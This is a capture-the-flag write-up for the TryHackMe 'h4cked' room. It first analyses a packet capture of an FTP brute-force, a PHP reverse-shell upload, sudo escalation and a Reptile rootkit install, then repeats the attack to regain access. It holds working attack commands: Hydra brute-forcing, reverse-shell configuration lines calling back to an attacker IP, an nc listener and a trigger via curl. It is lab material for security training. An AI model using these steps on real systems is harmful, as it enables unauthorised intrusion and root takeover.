---
tags:
  - THM
  - Easy
  - Linux
  - Challenge
  - File-Analysis
  - Brute-Force
  - File-Upload
  - RCE
  - Sudo
---
https://tryhackme.com/room/h4cked/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.75.126 h4cked.thm
```
# Cyberattack Analysis
A machine was hacked and we are given a `Capture_1612220005488.pcapng` file to find out what happened and recover access to the machine.

The FTP server was brute-forced against user **jenny**, probably using [Hydra](https://github.com/vanhauser-thc/thc-hydra):
```console
$ tshark -r Capture_1612220005488.pcapng -Y '(ftp or ftp-data) and frame.number >= 269'

  269 4.043289786 192.168.0.147 → 192.168.0.115 FTP 78 Request: USER jenny
  271 4.043968536 192.168.0.115 → 192.168.0.147 FTP 100 Response: 331 Please specify the password.
  273 4.108928101 192.168.0.147 → 192.168.0.115 FTP 81 Request: PASS football
  274 4.121641334 192.168.0.147 → 192.168.0.115 FTP 79 Request: PASS 000000
  275 4.121775961 192.168.0.147 → 192.168.0.115 FTP 83 Request: PASS 1234567890
  276 4.133276834 192.168.0.147 → 192.168.0.115 FTP 81 Request: PASS computer
  277 4.139140394 192.168.0.147 → 192.168.0.115 FTP 81 Request: PASS superman
  278 4.140089079 192.168.0.147 → 192.168.0.115 FTP 81 Request: PASS internet
  279 4.141101744 192.168.0.147 → 192.168.0.115 FTP 84 Request: PASS password123
  280 4.141239103 192.168.0.147 → 192.168.0.115 FTP 81 Request: PASS 1qaz2wsx
  281 4.143016631 192.168.0.147 → 192.168.0.115 FTP 79 Request: PASS monkey
  282 4.143070454 192.168.0.147 → 192.168.0.115 FTP 80 Request: PASS michael
  283 4.143117473 192.168.0.147 → 192.168.0.115 FTP 79 Request: PASS shadow
  284 4.143165226 192.168.0.147 → 192.168.0.115 FTP 79 Request: PASS 666666
  285 4.143223120 192.168.0.147 → 192.168.0.115 FTP 80 Request: PASS letmein
  286 4.143998457 192.168.0.147 → 192.168.0.115 FTP 80 Request: PASS jessica
  287 4.144241741 192.168.0.147 → 192.168.0.115 FTP 81 Request: PASS iloveyou
  288 4.144977692 192.168.0.147 → 192.168.0.115 FTP 79 Request: PASS daniel
```
The password for user **jenny** was `password123`. Then, the attacker uploaded a reverse shell:
```console
$ tshark -r Capture_1612220005488.pcapng -Y '(ftp or ftp-data) and frame.number >= 390'

  390 11.414730239 192.168.0.147 → 192.168.0.115 FTP 78 Request: USER jenny
  392 11.415245809 192.168.0.115 → 192.168.0.147 FTP 100 Response: 331 Please specify the password.
  394 13.968715114 192.168.0.147 → 192.168.0.115 FTP 84 Request: PASS password123
  395 14.002582310 192.168.0.115 → 192.168.0.147 FTP 89 Response: 230 Login successful.
  397 14.002831431 192.168.0.147 → 192.168.0.115 FTP 72 Request: SYST
  398 14.003298147 192.168.0.115 → 192.168.0.147 FTP 85 Response: 215 UNIX Type: L8
  400 15.576739978 192.168.0.147 → 192.168.0.115 FTP 71 Request: PWD
  401 15.577170346 192.168.0.115 → 192.168.0.147 FTP 112 Response: 257 "/var/www/html" is the current directory
  403 16.826851138 192.168.0.147 → 192.168.0.115 FTP 93 Request: PORT 192,168,0,147,225,49
  404 16.827401969 192.168.0.115 → 192.168.0.147 FTP 117 Response: 200 PORT command successful. Consider using PASV.
  406 16.827509621 192.168.0.147 → 192.168.0.115 FTP 76 Request: LIST -la
  410 16.828772908 192.168.0.115 → 192.168.0.147 FTP 105 Response: 150 Here comes the directory listing.
  412 16.828938602 192.168.0.115 → 192.168.0.147 FTP-DATA 253 FTP Data: 187 bytes (PORT) (LIST -la)
  417 16.829367855 192.168.0.115 → 192.168.0.147 FTP 90 Response: 226 Directory send OK.
  419 19.320841361 192.168.0.147 → 192.168.0.115 FTP 74 Request: TYPE I
  420 19.321301970 192.168.0.115 → 192.168.0.147 FTP 97 Response: 200 Switching to Binary mode.
  422 19.321437616 192.168.0.147 → 192.168.0.115 FTP 94 Request: PORT 192,168,0,147,196,163
  423 19.323545813 192.168.0.115 → 192.168.0.147 FTP 117 Response: 200 PORT command successful. Consider using PASV.
  425 19.323635348 192.168.0.147 → 192.168.0.115 FTP 82 Request: STOR shell.php
  429 19.324742316 192.168.0.115 → 192.168.0.147 FTP 88 Response: 150 Ok to send data.
  431 19.324910508 192.168.0.147 → 192.168.0.115 FTP-DATA 5559 FTP Data: 5493 bytes (PORT) (STOR shell.php)
  436 19.325877349 192.168.0.115 → 192.168.0.147 FTP 90 Response: 226 Transfer complete.
  438 22.682708871 192.168.0.147 → 192.168.0.115 FTP 92 Request: SITE CHMOD 777 shell.php
  439 22.683282161 192.168.0.115 → 192.168.0.147 FTP 94 Response: 200 SITE CHMOD command ok.
  441 28.215583338 192.168.0.147 → 192.168.0.115 FTP 72 Request: QUIT
  442 28.216001461 192.168.0.115 → 192.168.0.147 FTP 80 Response: 221 Goodbye.
```
The reverse shell was stored at `/var/www/html`, so it was probably loaded from a **web server** by the attacker to get a connection:
```console
$ tshark -r Capture_1612220005488.pcapng -Y 'frame.number == 431' -V | grep 'working directory'

[Current working directory: /var/www/html]
```
The attacker became **root** by running `sudo su` as **jenny**:
```console
$ tshark -r Capture_1612220005488.pcapng -q -z 'follow,tcp,ascii,20'

sudo -l
2


27
[sudo] password for jenny: 
	12
password123

2


44
Matching Defaults entries for jenny on wir3:
124

    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
4



50
User jenny may run the following commands on wir3:
2


21
    (ALL : ALL) ALL

14
jenny@wir3:/$ 
	8
sudo su

9
sudo su

13
root@wir3:/# 
	7
whoami

8
whoami

4
root
2
```
Finally, the attacker installed a **rootkit** called [Reptile](https://web.archive.org/web/20250604140404/https://github.com/f0rb1dd3n/Reptile):
```console
$ tshark -r Capture_1612220005488.pcapng -q -z 'follow,tcp,ascii,20'

17
cd
root@wir3:~# 
	51
git clone https://github.com/f0rb1dd3n/Reptile.git

52
git clone https://github.com/f0rb1dd3n/Reptile.git

25
Cloning into 'Reptile'...
2

33
cd Reptile
root@wir3:~/Reptile# 
	7
ls -la

560
ls -la
total 44
drwxr-xr-x 7 root root 4096 Feb  1 22:27 .
drwx------ 4 root root 4096 Feb  1 22:27 ..
drwxr-xr-x 2 root root 4096 Feb  1 22:27 configs
drwxr-xr-x 8 root root 4096 Feb  1 22:27 .git
-rw-r--r-- 1 root root    8 Feb  1 22:27 .gitignore
-rw-r--r-- 1 root root 1922 Feb  1 22:27 Kconfig
drwxr-xr-x 7 root root 4096 Feb  1 22:27 kernel
-rw-r--r-- 1 root root 1852 Feb  1 22:27 Makefile
-rw-r--r-- 1 root root 2183 Feb  1 22:27 README.md
drwxr-xr-x 4 root root 4096 Feb  1 22:27 scripts
drwxr-xr-x 6 root root 4096 Feb  1 22:27 userland

21
root@wir3:~/Reptile# 
	5
make

6
make
```
# Recover Access
## Brute-Forcing FTP
The attacker changed **jenny**'s password:
```console
$ sshpass -p 'password123' ftp jenny@h4cked.thm

Connected to h4cked.thm.
220 Hello FTP World!
331 Please specify the password.
530 Login incorrect.
ftp: Login failed.
```
Brute-force the FTP service to find the **new password** for **jenny**:
```console
$ hydra -l jenny -P /usr/share/dict/rockyou.txt ftp://h4cked.thm

[21][ftp] host: h4cked.thm   login: jenny   password: 987654321
```
## Uploading Reverse Shell
Log in via FTP as **jenny**:
```bash
sshpass -p '987654321' ftp jenny@h4cked.thm
```
Download the attacker's reverse shell:
```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
226 Directory send OK.

ftp> get shell.php
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for shell.php (5493 bytes).
226 Transfer complete.
5493 bytes received in 0.0004 seconds (12.3424 Mbytes/s)
```
Modify lines 49 and 50 of the `shell.php` file with our own IP and port:
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.147';  // CHANGE THIS
$port = 80;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Upload the new modified `shell.php` file:
```console
ftp> put shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
5493 bytes sent in 0.0001 seconds (38.5950 Mbytes/s)

ftp> quit
221 Goodbye.
```
Wait for connections:
```bash
nc -lvnp <PORT>
```
Establish a reverse shell connection:
```bash
curl -s http://h4cked.thm/shell.php
```
## Privilege Escalation
Become user **jenny**, using `987654321` as password, and then use `sudo su` to become **root**:
```console
$ whoami
www-data

$ su jenny
Password:

$ sudo su
[sudo] password for jenny:

# whoami
root
```
Get the **flag**:
```bash
cat /root/Reptile/flag.txt
```